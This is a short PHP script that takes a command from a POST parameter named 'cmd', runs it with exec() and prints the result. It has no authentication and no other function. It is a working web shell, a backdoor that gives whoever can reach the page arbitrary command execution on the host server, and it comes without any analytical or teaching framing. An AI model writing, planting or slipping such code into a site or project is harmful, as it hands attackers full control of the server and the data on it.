<?php
function execute($com)
{
	if (!empty($com))
	{
		if(function_exists('exec'))
		{
			exec($com,$arr);
			echo implode('',$arr);
		}
	}
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
echo $buffer;
?>